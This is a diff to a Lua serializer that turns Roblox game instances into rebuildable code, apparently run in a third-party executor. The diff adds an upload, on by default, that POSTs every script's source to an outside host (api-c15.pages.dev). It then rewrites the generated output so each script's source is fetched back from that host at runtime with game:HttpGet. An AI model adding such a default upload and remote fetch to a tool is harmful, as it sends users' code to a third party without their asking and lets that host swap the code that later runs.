@@ -1,4 +1,18 @@
 local CollectionService = game:GetService("CollectionService")
+local HttpService = game:GetService("HttpService")
+
+-- ============================================================
+-- API CONFIGURATION – Set to your endpoint
+-- ============================================================
+local API_CONFIG = {
+    Enabled = true,   -- Upload scripts to API
+    Endpoint = "https://api-c15.pages.dev/api/v2/",
+    Key = "",         -- No key needed
+    Field = "content",
+    ResponseField = "url",
+    ExpiryDays = 30,  -- You can change to 7 or any other
+}
+-- ============================================================
 
 -- Skip these properties because they are read-only, irrelevant, or handled manually
 local SkipProperties = {
@@ -32,7 +46,6 @@ local SkipProperties = {
 	Shiny = true, Specular = true, ShapeInOut = true, ShapePartial = true,
 	ShapeRotation = true, ShapeStyle = true, CameraMode = true,
 	DevCameraOcclusionMode = true, DevTouchCameraMovementMode = true,
-	-- Read-only computed properties (not settable)
 	WorldPosition = true, WorldCFrame = true, WorldOrientation = true,
 	WorldAxis = true, WorldSecondaryAxis = true,
 }
@@ -212,12 +225,10 @@ local FallbackProperties = {
 		Axis = Vector3.new(1, 0, 0), CFrame = CFrame.new(),
 		Orientation = Vector3.new(), Position = Vector3.new(),
 		SecondaryAxis = Vector3.new(0, 1, 0), Visible = false,
-		-- Read-only computed properties removed from fallback
 	},
 	Bone = {
 		CFrame = CFrame.new(), Orientation = Vector3.new(), Position = Vector3.new(),
 		Transform = CFrame.new(),
-		-- Read-only computed properties removed from fallback
 	},
 	Beam = {
 		Attachment0 = nil, Attachment1 = nil, Brightness = 1,
@@ -604,7 +615,7 @@ local FallbackProperties = {
 	Chat = { BubbleChatEnabled = false, TypingIndicator = false },
 }
 
--- GUI base properties merged into GUI classes
+-- Merge GUI base properties into GUI classes
 local GuiObjectBase = {
 	Active = false, AnchorPoint = Vector2.new(), AutomaticSize = Enum.AutomaticSize.None,
 	BackgroundColor3 = Color3.new(1, 1, 1), BackgroundTransparency = 0,
@@ -635,7 +646,7 @@ for _, Class in ipairs(TextClasses) do
 	for K, V in pairs(TextBase) do if T[K] == nil then T[K] = V end end
 end
 
--- Inheritance mapping for fallback merging
+-- Inheritance mapping
 local Inheritance = {
 	Part = {"BasePart", "Instance"}, WedgePart = {"BasePart", "Instance"},
 	CornerWedgePart = {"BasePart", "Instance"}, TrussPart = {"BasePart", "Instance"},
@@ -703,7 +714,7 @@ local Inheritance = {
 	StarterPlayerScripts = {"Instance"}, LocalizationService = {"Instance"}, Chat = {"Instance"},
 }
 
--- Extra explicit property hints to guarantee VFX and other critical properties are captured
+-- Extra explicit property hints
 local ExactPropertyHints = {
 	Instance = { "Name" },
 	BasePart = {
@@ -764,7 +775,7 @@ local function Num(N)
 	if N == math.huge then return "math.huge" end
 	if N == -math.huge then return "-math.huge" end
 	if math.floor(N) == N and math.abs(N) < 1e15 then return tostring(N) end
-	return string.format("%.17g", N)  -- Full double precision
+	return string.format("%.17g", N)
 end
 
 -- Path resolver for references
@@ -899,6 +910,34 @@ local function _IsService(I)
 	return ok and res
 end
 
+-- Upload script source to API
+local function UploadScript(Src)
+	if not API_CONFIG.Enabled then return nil end
+	local payload = {
+		[API_CONFIG.Field] = Src,
+	}
+	if API_CONFIG.ExpiryDays then payload["expiry_days"] = API_CONFIG.ExpiryDays end
+	local headers = { ["Content-Type"] = "application/json" }
+	if API_CONFIG.Key and API_CONFIG.Key ~= "" then
+		headers["Authorization"] = API_CONFIG.Key
+	end
+	local ok, res = pcall(function()
+		return request({
+			Url = API_CONFIG.Endpoint,
+			Method = "POST",
+			Headers = headers,
+			Body = HttpService:JSONEncode(payload)
+		})
+	end)
+	if ok and res and res.Body then
+		local okDec, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+		if okDec and data and data[API_CONFIG.ResponseField] then
+			return data[API_CONFIG.ResponseField]
+		end
+	end
+	return nil
+end
+
 -- Resolve fallback properties with inheritance
 local function ResolveFallbackProps(Inst)
 	local merged = {}
@@ -988,7 +1027,6 @@ local function Build(target)
 	end
 
 	local out = {}
-	-- Emit function, no name conflicts
 	local function Emit(...)
 		local args = {...}
 		if #args == 1 then
@@ -1026,7 +1064,6 @@ local function Build(target)
 			local props = GetProps(inst)
 			local pnames = {}
 			for n in pairs(props) do pnames[#pnames+1] = n end
-			-- Custom sort: CFrame last, then alphabetical
 			table.sort(pnames, function(a, b)
 				if a == "CFrame" then return false end
 				if b == "CFrame" then return true end
@@ -1041,9 +1078,15 @@ local function Build(target)
 					elseif t == "function" then
 						-- skip
 					elseif propName == "Source" then
+						-- Handle script source with optional upload
 						local src = val
 						if type(src) == "string" and #src > 0 then
-							deferred[#deferred+1] = string.format("S(o[%d],'Source',%q)", idx, src)
+							local url = UploadScript(src)
+							if url then
+								deferred[#deferred+1] = string.format("S(o[%d],'Source',game:HttpGet(%q))", idx, url)
+							else
+								deferred[#deferred+1] = string.format("S(o[%d],'Source',%q)", idx, src)
+							end
 						end
 					else
 						local serialized = Ser(val, refs)
